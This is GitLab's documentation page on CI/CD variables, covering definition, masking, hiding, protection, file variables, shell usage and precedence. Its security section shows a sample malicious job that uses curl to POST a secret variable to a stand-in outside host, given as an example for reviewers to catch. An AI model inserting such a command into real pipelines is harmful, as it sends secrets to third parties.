---
stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments
title: GitLab CI/CD variables
description: Configuration, usage, and security.
---

{{< details >}}

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

{{< /details >}}

CI/CD variables are a type of environment variable. You can use them to:

- Control the behavior of jobs and [pipelines](../pipelines/_index.md).
- Store values you want to re-use.
- Avoid hard-coding values in your `.gitlab-ci.yml` file.

You can [override variable values](#cicd-variable-precedence) for a specific pipeline when you [run a pipeline manually](../pipelines/_index.md#run-a-pipeline-manually), [run a manual job](../jobs/job_control.md#specify-variables-when-running-manual-jobs),
or have them [prefilled in manual pipelines](../pipelines/_index.md#prefill-variables-in-manual-pipelines).

Variable names are limited by the [shell the runner uses](https://docs.gitlab.com/runner/shells/)
to execute scripts. Each shell has its own set of reserved variable names.

To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the [Psych YAML parser](https://docs.ruby-lang.org/en/master/Psych.html),
so quoted and unquoted variables might be parsed differently. For example, `VAR1: 012345`
is interpreted as an octal value, so the value becomes `5349`, but `VAR1: "012345"` is parsed
as a string with a value of `012345`.

For more information about advanced use of GitLab CI/CD, see [7 advanced GitLab CI workflow hacks](https://about.gitlab.com/webcast/7cicd-hacks/) shared by GitLab engineers.

## Predefined CI/CD variables

GitLab CI/CD makes a set of [predefined CI/CD variables](predefined_variables.md)
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.

You can use predefined CI/CD variables in your `.gitlab-ci.yml` without declaring them first.
For example:

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

The script in this example outputs `The job's stage is 'test'`.

## CI/CD configuration variables

GitLab CI/CD also makes configuration CI/CD variables available for use in pipeline configuration and job scripts.
You can use GitLab CI/CD configuration variables in pipeline configuration and job scripts to configure runner
and the job execution environment.

You cannot directly define configuration variables in a `.gitlab-ci.yml` file.
Runner administrators can define these variables indirectly as settings in a
[`.config.toml`](https://docs.gitlab.com/runner/configuration/advanced-configuration/) file.

For example, when you configure TLS certificate settings for HTTPS communication:

```toml
[[runners]]
  name = "gl-docker-runner"
  url = "https://gitlab.com/example/url"
  token = "user-token"
  executor = "docker"

  tls-ca-file = "/example/gl-runner/certs/ca.crt"
  tls-cert-file = "/example/gl-runner/certs/cert.crt"
  tls-key-file = "/example/gl-runner/certs/key.key"
```

The primary purpose of the `tls-ca-file` setting is to specify the certificate authority file for HTTPS verification.
As a byproduct of this configuration, GitLab Runner automatically creates the `CI_SERVER_TLS_CA_FILE` configuration variable,
which becomes available to your CI/CD jobs.

Configuration variables are only available under certain conditions.
For example, the configuration variable `CI_SERVER_TLS_CA_FILE` (which configures the custom
Certificate Authority file) is only available when:

- You configure it in the `config.toml` file by using the `tls-ca-file` setting.
- The job instance uses HTTPS, which prompts the runner to automatically build a CA verification chain.

To summarize, the following are the differences between predefined and configuration variables:

|                | Predefined variables      | Configuration variables                            |
|----------------|---------------------------|----------------------------------------------------|
| Purpose        | Supports script logic     | Configure runner and the job execution environment |
| Availability   | Always available          | Available only under specific conditions           |
| Defined by     | Users in `.gitlab-ci.yml` | Administrators in `config.toml`                    |

## Define a CI/CD variable in the `.gitlab-ci.yml` file

To create a CI/CD variable in the `.gitlab-ci.yml` file, define the variable and
value with the [`variables`](../yaml/_index.md#variables) keyword.

Variables saved in the `.gitlab-ci.yml` file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a `DATABASE_URL` variable. Sensitive variables containing values
like secrets or keys should be [added in the UI](#define-a-cicd-variable-in-the-ui).

You can define `variables` in:

- A job: The variable is only available in that job's `script`, `before_script`, or `after_script` sections, and with some [job keywords](../yaml/_index.md#job-keywords).
- The top-level of the `.gitlab-ci.yml` file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job's variable takes precedence.

In both cases, you cannot use these variables with [global keywords](../yaml/_index.md#global-keywords).

For example:

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

In this example:

- `job1` outputs: `Variables are 'A default variable' and 'Job 1 variable'`
- `job2` outputs: `Variables are 'Different value than default', 'Job 2 variable', and ''`

Use the [`value` and `description`](../yaml/_index.md#variablesdescription) keywords
to define [variables that are prefilled](../pipelines/_index.md#prefill-variables-in-manual-pipelines)
for [manually-triggered pipelines](../pipelines/_index.md#run-a-pipeline-manually).

### Skip default variables in a single job

If you don't want default variables to be available in a job, set `variables`
to `{}`:

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## Define a CI/CD variable in the UI

Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not [in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file).
Add CI/CD variables in the UI:

- For a project [in the project's settings](#for-a-project).
- For all projects in a group [in the group's setting](#for-a-group).
- For all projects in a GitLab instance [in the instance's settings](#for-an-instance).

Alternatively, these variables can be added by using the API:

- [With the project-level variables API endpoint](../../api/project_level_variables.md).
- [With the group-level variables API endpoint](../../api/group_level_variables.md).
- [With the instance-level variables API endpoint](../../api/instance_level_ci_variables.md).

By default, pipelines from forked projects can't access the CI/CD variables available to the parent project.
If you [run a merge request pipeline in the parent project for a merge request from a fork](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project),
all variables become available to the pipeline.

### For a project

{{< history >}}

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/362227) in GitLab 15.7, projects can have a maximum of 200 CI/CD variables.
- [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/373289) in GitLab 15.9, projects can have a maximum of 8000 CI/CD variables.

{{< /history >}}

You can add CI/CD variables to a project's settings.

Prerequisites:

- You must be a project member with the Maintainer role.

To add or update variables in the project settings:

1. On the left sidebar, select **Search or go to** and find your project.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Environment scope**: Optional. **All (default)** (`*`), a specific [environment](../environments/_index.md#types-of-environments),
     or a wildcard [environment scope](../environments/_index.md#limit-the-environment-scope-of-a-cicd-variable).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](../../user/project/repository/branches/protected.md)
     or [protected tags](../../user/project/protected_tags.md).
   - **Visibility**: Select **Visible** (default), [**Masked**](#mask-a-cicd-variable),
     or [**Masked and hidden**](#hide-a-cicd-variable) (only available for new variables).

After you create a variable, you can use it in the pipeline configuration
or in [job scripts](#use-cicd-variables-in-job-scripts).

### For a group

{{< history >}}

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/362227) in GitLab 15.7, groups can have a maximum of 200 CI/CD variables.
- [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/373289) in GitLab 15.9, groups can have a maximum of 30000 CI/CD variables.

{{< /history >}}

You can make a CI/CD variable available to all projects in a group.

Prerequisites:

- You must be a group member with the Owner role.

To add a group variable:

1. On the left sidebar, select **Search or go to** and find your group.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: No limitations.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](../../user/project/repository/branches/protected.md)
     or [protected tags](../../user/project/protected_tags.md).
   - **Visibility**: Select **Visible** (default), [**Masked**](#mask-a-cicd-variable),
     or [**Masked and hidden**](#hide-a-cicd-variable) (only available for new variables).

The group variables that are available in a project are listed in the project's
**Settings > CI/CD > Variables** section. Variables from [subgroups](../../user/group/subgroups/_index.md)
are recursively inherited.

#### Environment scope

{{< details >}}

- Tier: Premium, Ultimate

{{< /details >}}

To set a group CI/CD variable to only be available for certain environments:

1. On the left sidebar, select **Search or go to** and find your group.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. To the right of the variable, select **Edit** ({{< icon name="pencil" >}}).
1. For **Environment scope**, select **All (default)** (`*`), a specific [environment](../environments/_index.md#types-of-environments),
   or a wildcard [environment scope](../environments/_index.md#limit-the-environment-scope-of-a-cicd-variable).

### For an instance

{{< details >}}

- Tier: Free, Premium, Ultimate
- Offering: GitLab Self-Managed, GitLab Dedicated

{{< /details >}}

You can make a CI/CD variable available to all projects and groups in a GitLab instance.

Prerequisites:

- You must have administrator access to the instance.

To add an instance variable:

1. On the left sidebar, at the bottom, select **Admin**.
1. Select **Settings > CI/CD**.
1. Expand **Variables**.
1. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner's operating system.
   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on [protected branches](../../user/project/repository/branches/protected.md)
     or [protected tags](../../user/project/protected_tags.md).
   - **Visibility**: Select **Visible** (default), [**Masked**](#mask-a-cicd-variable),
     or [**Masked and hidden**](#hide-a-cicd-variable) (only available for new variables).

## CI/CD variable security

Code pushed to the `.gitlab-ci.yml` file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.

Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:

- [Run a pipeline in the parent project for a merge request submitted from a forked project](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project).
- Merge the changes.

Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.

The following example shows malicious code in a `.gitlab-ci.yml` file:

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

To help reduce the risk of accidentally leaking secrets through scripts like in `accidental-leak-job`,
all variables containing sensitive information should always be [masked in job logs](#mask-a-cicd-variable).
You can also [limit a variable to protected branches and tags only](#protect-a-cicd-variable).

Alternatively, use one of the native GitLab integrations to connect with third party
secrets manager providers to store and retrieve secrets:

- [HashiCorp Vault](../secrets/_index.md)
- [Azure Key Vault](../secrets/azure_key_vault.md)
- [Google Secret Manager](../secrets/gcp_secret_manager.md)

You can also use [OpenID Connect (OIDC) authentication](../secrets/id_token_authentication.md)
for secrets managers which do not have a native integration.

Malicious scripts like in `malicious-job` must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.

Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
and stored in the database. This data can only be read and decrypted with a
valid [secrets file](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost).

### Mask a CI/CD variable

{{< alert type="warning" >}}

Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using [external secrets](../secrets/_index.md) and [file type variables](#use-file-type-cicd-variables)
to prevent commands such as `env`/`printenv` from printing secret variables.

{{< /alert >}}

You can mask a project, group, or instance CI/CD variable so the value of the variable
does not display in job logs. When a masked CI/CD variable would be displayed in a job log,
the value is replaced with `[masked]` to prevent the value from being exposed.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To mask a variable:

1. For the group, project, or in the **Admin** area, select **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to protect, select **Edit**.
1. Under **Visibility**, select **Mask variable**.
1. Select **Update variable**.

The method used to mask variables [limits what can be included in a masked variable](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/13784#note_106756757).
The value of the variable must:

- Be a single line with no spaces.
- Be 8 characters or longer.
- Not match the name of an existing predefined or custom CI/CD variable.
- Not include non-alphanumeric characters other than `@`, `_`, `-`, `:`, or `+`.

Additionally, if [variable expansion](#prevent-cicd-variable-expansion) is enabled,
the value can contain only:

- Characters from the Base64 alphabet (RFC4648).
- The `@`, `:`, `.`, or `~` characters.

Masking a variable automatically masks the value anywhere in a job log. If another
variable has the same value, that value is also masked, including when a variable
references a masked variable. The string `[MASKED]` is shown instead of the value,
possibly with some trailing `x` characters.

Different versions of [GitLab Runner](../runners/_index.md) have different masking limitations:

| Version             | Limitations |
| ------------------- | ----------- |
| v14.1.0 and earlier | Masking of large secrets (greater than 4 KiB) could potentially be [revealed](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/28128). No sensitive URL parameter masking. |
| v14.2.0 to v15.3.0  | The tail of a large secret (greater than 4 KiB) could potentially be [revealed](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/28128). No sensitive URL parameter masking. |
| v15.7.0 and later   | Secrets could be revealed when `CI_DEBUG_SERVICES` is enabled. For details, read about [service container logging](../services/_index.md#capturing-service-container-logs). |

### Hide a CI/CD variable

{{< history >}}

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/29674) in GitLab 17.4 [with a flag](../../administration/feature_flags.md) named `ci_hidden_variables`. Enabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843) in GitLab 17.6. Feature flag `ci_hidden_variables` removed.

{{< /history >}}

In addition to masking, you can also prevent the value of CI/CD variables from being revealed
in the **CI/CD** settings page. Hiding a variable is only possible when creating a new variable,
you cannot update an existing variable to be hidden.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).
- The variable value must match the [requirements for masked variables](#mask-a-cicd-variable).

To hide a variable, select **Masked and hidden** in the **Visibility** section when
you [add a new CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).
After you save the variable, the variable can be used in CI/CD pipelines, but cannot
be revealed in the UI again.

### Protect a CI/CD variable

You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on [protected branches](../../user/project/repository/branches/protected.md)
or [protected tags](../../user/project/protected_tags.md).

[Merged results pipelines](../pipelines/merged_results_pipelines.md) and [merge request pipelines](../pipelines/merge_request_pipelines.md) can optionally [access protected variables](../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners).

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To set a variable as protected:

1. For the project or group, go to **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to protect, select **Edit**.
1. Select the **Protect variable** checkbox.
1. Select **Update variable**.

The variable is available for all subsequent pipelines.

### Use file type CI/CD variables

All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file
are "variable" type ([`variable_type` of `env_var` in the API](#define-a-cicd-variable-in-the-ui)).
Variable type variables:

- Consist of a key and value pair.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value as the environment variable value.

Project, group, and instance CI/CD variables are "variable" type by default, but can
optionally be set as a "file" type ([`variable_type` of `file` in the API](#define-a-cicd-variable-in-the-ui)).
File type variables:

- Consist of a key, value, and file.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value saved to a temporary file.
  - The path to the temporary file as the environment variable value.

Use file type CI/CD variables for tools that need a file as input. [The AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
and [`kubectl`](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#the-kubeconfig-environment-variable)
are both tools that use `File` type variables for configuration.

For example, if you are using `kubectl` with:

- A variable with a key of `KUBE_URL` and `https://example.com` as the value.
- A file type variable with a key of `KUBE_CA_PEM` and a certificate as the value.

Pass `KUBE_URL` as a `--server` option, which accepts a variable, and pass `$KUBE_CA_PEM`
as a `--certificate-authority` option, which accepts a path to a file:

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

{{< alert type="warning" >}}

Be careful when assigning the value of a file variable to another variable in GitLab 15.6 or older.
The other variable takes the content of the file as its value, **not** the path to the file.
In GitLab 15.7 and later, this behavior [was fixed](https://gitlab.com/gitlab-org/gitlab/-/issues/29407) and the other variable now takes the path to the file as the value.

{{< /alert >}}

#### Use a `.gitlab-ci.yml` variable as a file type variable

You cannot set a CI/CD variable [defined in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file)
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the `.gitlab-ci.yml`:

- Run a command that saves the value of the variable in a file.
- Use that file with your tool.

For example:

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## Use CI/CD variables in job scripts

All CI/CD variables are set as environment variables in the job's environment.
You can use variables in job scripts with the standard formatting for each environment's
shell.

To access environment variables, use the syntax for your [runner executor's shell](https://docs.gitlab.com/runner/executors/).

### With Bash, `sh` and similar

To access environment variables in Bash, `sh`, and similar shells, prefix the
CI/CD variable with (`$`):

```yaml
job_name:
  script:
    - echo "$CI_JOB_ID"
```

### With PowerShell

To access variables in a Windows PowerShell environment, including environment
variables set by the system, prefix the variable name with `$env:` or `$`:

```yaml
job_name:
  script:
    - echo $env:CI_JOB_ID
    - echo $CI_JOB_ID
    - echo $env:PATH
```

In [some cases](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/4115#note_157692820)
environment variables must be surrounded by quotes to expand properly:

```yaml
job_name:
  script:
    - D:\\qislsf\\apache-ant-1.10.5\\bin\\ant.bat "-DsosposDailyUsr=$env:SOSPOS_DAILY_USR" portal_test
```

### With Windows Batch

To access CI/CD variables in Windows Batch, surround the variable with `%`:

```yaml
job_name:
  script:
    - echo %CI_JOB_ID%
```

You can also surround the variable with `!` for [delayed expansion](https://ss64.com/nt/delayedexpansion.html).
Delayed expansion might be needed for variables that contain white spaces or newlines:

```yaml
job_name:
  script:
    - echo !ERROR_MESSAGE!
```

### In service containers

[Service containers](../docker/using_docker_images.md) can use CI/CD variables, but
by default can only access [variables saved in the `.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file).
Variables [added in the GitLab UI](#define-a-cicd-variable-in-the-ui) are not available to
service containers, because service containers are not trusted by default.

To make a UI-defined variable available in a service container, you can re-assign
it to another variable in your `.gitlab-ci.yml`:

```yaml
variables:
  SA_PASSWORD_YAML_FILE: $SA_PASSWORD_UI
```

The re-assigned variable cannot have the same name as the original variable. Otherwise it does not get expanded.

### Pass an environment variable to another job

You can create a new environment variable in a job, and pass it to another job
in a later stage. These variables cannot be used as CI/CD variables to configure a pipeline
(for example with the [`rules` keyword](../yaml/_index.md#rules)), but they can be used in job scripts.

To pass a job-created environment variable to other jobs:

1. In the job script, save the variable as a `.env` file.
   - The format of the file must be one variable definition per line.
   - Each line must be formatted as: `VARIABLE_NAME=ANY VALUE HERE`.
   - Values can be wrapped in quotes, but cannot contain newline characters.
1. Save the `.env` file as an [`artifacts:reports:dotenv`](../yaml/artifacts_reports.md#artifactsreportsdotenv)
   artifact.
1. Jobs in later stages can then [use the variable in scripts](#use-cicd-variables-in-job-scripts),
   unless [jobs are configured not to receive `dotenv` variables](#control-which-jobs-receive-dotenv-variables).

For example:

```yaml
build-job:
  stage: build
  script:
    - echo "BUILD_VARIABLE=value_from_build_job" >> build.env
  artifacts:
    reports:
      dotenv: build.env

test-job:
  stage: test
  script:
    - echo "$BUILD_VARIABLE"  # Output is: 'value_from_build_job'
```

Variables from `dotenv` reports [take precedence](#cicd-variable-precedence) over
certain types of new variable definitions such as job defined variables.

You can also [pass `dotenv` variables to downstream pipelines](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job).

#### Control which jobs receive `dotenv` variables

You can use the [`dependencies`](../yaml/_index.md#dependencies) or [`needs`](../yaml/_index.md#needs)
keywords to control which jobs receive the `dotenv` artifacts.

To have no environment variables from a `dotenv` artifact:

- Pass an empty `dependencies` or `needs` array.
- Pass [`needs:artifacts`](../yaml/_index.md#needsartifacts) as `false`.
- Set `needs` to only list jobs that do not have a `dotenv` artifact.

For example:

```yaml
build-job1:
  stage: build
  script:
    - echo "BUILD_VERSION=v1.0.0" >> build.env
  artifacts:
    reports:
      dotenv: build.env

build-job2:
  stage: build
  needs: []
  script:
    - echo "This job has no dotenv artifacts"

test-job1:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is: 'v1.0.0'
  dependencies:
    - build-job1

test-job2:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is ''
  dependencies: []

test-job3:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is: 'v1.0.0'
  needs:
    - build-job1

test-job4:
  stage: test
  script:
    - echo "$BUILD_VERSION"  # Output is: 'v1.0.0'
  needs:
    - job: build-job1
      artifacts: true

test-job5:
  stage: deploy
  script:
    - echo "$BUILD_VERSION"  # Output is ''
  needs:
    - job: build-job1
      artifacts: false

test-job6:
  stage: deploy
  script:
    - echo "$BUILD_VERSION"  # Output is ''
  needs:
    - build-job2
```

### Pass an environment variable from the `script` section to another section in the same job

Use `$GITLAB_ENV` to pass environment variables defined in the `script` section to another section.

For example:

```yaml
build-job:
  stage: build
  script:
    - echo "ARCH=$(arch)" >> $GITLAB_ENV
    - touch some-file-$(arch)
  artifacts:
    paths:
      - some-file-$ARCH
```

To also reference the variable in other stages, write the variable to both the `$GITLAB_ENV` and `.env` files:

```yaml
build-job:
  stage: build
  script:
    - echo "ARCH=$(arch)" | tee -a $GITLAB_ENV >> build.env
    - touch some-file-$(arch)
  artifacts:
    paths:
      - some-file-$ARCH
    reports:
      dotenv: build.env

release-job:
  stage: release
  script:
    - curl --upload-file some-file-$ARCH "https://example.com/some-file-$ARCH"
```

### Store multiple values in one variable

You cannot create a CI/CD variable that is an array of values, but you
can use shell scripting techniques for similar behavior.

For example, you can store multiple values separated by a space in a variable,
then loop through the values with a script:

```yaml
job1:
  variables:
    FOLDERS: src test docs
  script:
    - |
      for FOLDER in $FOLDERS
        do
          echo "The path is root/${FOLDER}"
        done
```

### As part of a string

You can use variables as part of a string. You can surround the variables with curly brackets (`{}`)
to help distinguish the variable name from the surrounding text. Without curly brackets,
the adjacent text is interpreted as part of the variable name. For example:

```yaml
job:
  variables:
    FLAGS: '-al'
    DIR: 'path/to/directory'
    LS_CMD: 'ls "$FLAGS"'
    CD_CMD: 'cd "${DIR}_files"'
  script:
    - 'eval "$LS_CMD"'  # Executes 'ls -al'
    - 'eval "$CD_CMD"'  # Executes 'cd path/to/directory_files'
```

## Use CI/CD variables in other variables

You can use variables inside other variables:

```yaml
job:
  variables:
    FLAGS: '-al'
    LS_CMD: 'ls "$FLAGS"'
  script:
    - 'eval "$LS_CMD"'  # Executes 'ls -al'
```

### Use the `$` character in CI/CD variables

If you do not want the `$` character interpreted as the start of another variable,
use `$$` instead:

```yaml
job:
  variables:
    FLAGS: '-al'
    LS_CMD: 'ls "$FLAGS" $$TMP_DIR'
  script:
    - 'eval "$LS_CMD"'  # Executes 'ls -al $TMP_DIR'
```

### Prevent CI/CD variable expansion

{{< history >}}

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/217309) in GitLab 15.7.

{{< /history >}}

Expanded variables treat values with the `$` character as a reference to another variable.
CI/CD variables are expanded by default. To treat variables with a `$` character as raw strings,
disable variable expansion for the variable

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](#define-a-cicd-variable-in-the-ui).

To disable variable expansion for the variable:

1. For the project or group, go to **Settings > CI/CD**.
1. Expand **Variables**.
1. Next to the variable you want to do not want expanded, select **Edit**.
1. Clear the **Expand variable** checkbox.
1. Select **Update variable**.

## CI/CD variable precedence

{{< history >}}

- Scan Execution Policies variable precedence was [changed](https://gitlab.com/gitlab-org/gitlab/-/issues/424028) in GitLab 16.7 [with a flag](../../administration/feature_flags.md) named `security_policies_variables_precedence`. Enabled by default. [Feature flag removed in GitLab 16.8](https://gitlab.com/gitlab-org/gitlab/-/issues/435727).

{{< /history >}}

You can use CI/CD variables with the same name in different places, but the values
can overwrite each other. The type of variable and where they are defined determines
which variables take precedence.

The order of precedence for variables is (from highest to lowest):

1. [Pipeline execution policy variables](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables).
1. [Scan execution policy variables](../../user/application_security/policies/scan_execution_policies.md).
1. [Pipeline variables](#use-pipeline-variables). These variables all have the same precedence:
   - [Variables passed to downstream pipelines](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline).
   - [Trigger variables](../triggers/_index.md#pass-cicd-variables-in-the-api-call).
   - [Scheduled pipeline variables](../pipelines/schedules.md#add-a-pipeline-schedule).
   - [Manual pipeline run variables](../pipelines/_index.md#run-a-pipeline-manually).
   - Variables added when [creating a pipeline with the API](../../api/pipelines.md#create-a-new-pipeline).
   - [Manual job variables](../jobs/job_control.md#specify-variables-when-running-manual-jobs).
1. Project [variables](#for-a-project).
1. Group [variables](#for-a-group). If the same variable name exists in a
   group and its subgroups, the job uses the value from the closest subgroup. For example, if
   you have `Group > Subgroup 1 > Subgroup 2 > Project`, the variable defined in
   `Subgroup 2` takes precedence.
1. Instance [variables](#for-an-instance).
1. [Variables from `dotenv` reports](#pass-an-environment-variable-to-another-job).
1. Job variables, defined in jobs in the `.gitlab-ci.yml` file.
1. Default variables for all jobs, defined at the top-level of the `.gitlab-ci.yml` file.
1. [Deployment variables](predefined_variables.md#deployment-variables).
1. [Predefined variables](predefined_variables.md).

For example:

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

In this example, `job1` outputs `The variable is 'secure'` because variables defined in jobs in the `.gitlab-ci.yml` file
have higher precedence than default variables.

## Use pipeline variables

Pipeline variables are variables that are specified when running a new pipeline.

Prerequisites:

- You must have the Developer role in the project.

You can specify a pipeline variable when you:

- [Run a pipeline manually](../pipelines/_index.md#run-a-pipeline-manually) in the UI.
- Create a pipeline by using [the `pipelines` API endpoint](../../api/pipelines.md#create-a-new-pipeline).
- Create a pipeline by using [the `triggers` API endpoint](../triggers/_index.md#pass-cicd-variables-in-the-api-call).
- Use [push options](../../topics/git/commit.md#push-options-for-gitlab-cicd).
- Pass variables to a downstream pipeline by using either the [`variables` keyword](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline),
  [`trigger:forward` keyword](../yaml/_index.md#triggerforward) or [`dotenv` variables](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job).
- Specify variables when [running a manual job](../pipelines/_index.md#run-a-pipeline-manually).

These variables have [higher precedence](#cicd-variable-precedence) and can override
other defined variables, including [predefined variables](predefined_variables.md).

{{< alert type="warning" >}}

You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.

{{< /alert >}}

{{< alert type="note" >}}

In [GitLab 17.7](../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables)
and later, [pipeline inputs](../inputs/_index.md#for-a-pipeline) are recommended over passing pipeline variables.
For enhanced security, you should [disable pipeline variables](#restrict-pipeline-variables) when using inputs.

{{< /alert >}}

### Restrict pipeline variables

{{< history >}}

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/440338) in GitLab 17.1.
- For GitLab.com, setting defaults [updated for all new projects in new namespaces](https://gitlab.com/gitlab-org/gitlab/-/issues/502382)
  to `no_one_allowed` for `ci_pipeline_variables_minimum_override_role` in GitLab 17.7.

{{< /history >}}

You can limit who can [run pipelines with pipeline variables](#use-pipeline-variables)
to specific user roles. When users with a lower role try to use pipeline variables,
they receive an `Insufficient permissions to set pipeline variables` error message.

Prerequisites:

- You must have the Maintainer role in the project. If the minimum role was previously set to `owner`
  or `no_one_allowed`, then you must have the Owner role in the project.

To limit the use of pipeline variables to only the Maintainer role and higher:

- Go to **Settings > CI/CD > Variables**.
- Under **Minimum role to use pipeline variables**, select one of:
  - `no_one_allowed`: No pipelines can run with pipeline variables.
    Default for new projects in new namespaces on GitLab.com.
  - `owner`: Only users with the Owner role can run pipelines with pipeline variables.
    You must have the Owner role for the project to change the setting to this value.
  - `maintainer`: Only users with at least the Maintainer role can run pipelines with pipeline variables.
    Default when not specified on GitLab Self-Managed and GitLab Dedicated.
  - `developer`: Only users with at least the Developer role can run pipelines with pipeline variables.

You can also use [the projects API](../../api/projects.md#edit-a-project) to set
the role for the `ci_pipeline_variables_minimum_override_role` setting.

This restriction does not affect the use of CI/CD variables from the project or group settings.
Most jobs can still use the `variables` keyword in the YAML configuration, but not
jobs that use the `trigger` keyword to trigger downstream pipelines. Trigger jobs
pass variables to a downstream pipelines as pipeline variables, which is also controlled
by this setting.

## Exporting variables

Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.

This means that if a job fails, variables created by user-defined scripts are not
exported.

When runners execute jobs defined in `.gitlab-ci.yml`:

- Scripts specified in `before_script` and the main script are executed together in
  a single shell context, and are concatenated.
- Scripts specified in `after_script` run in a shell context completely separate to
  the `before_script` and the specified scripts.

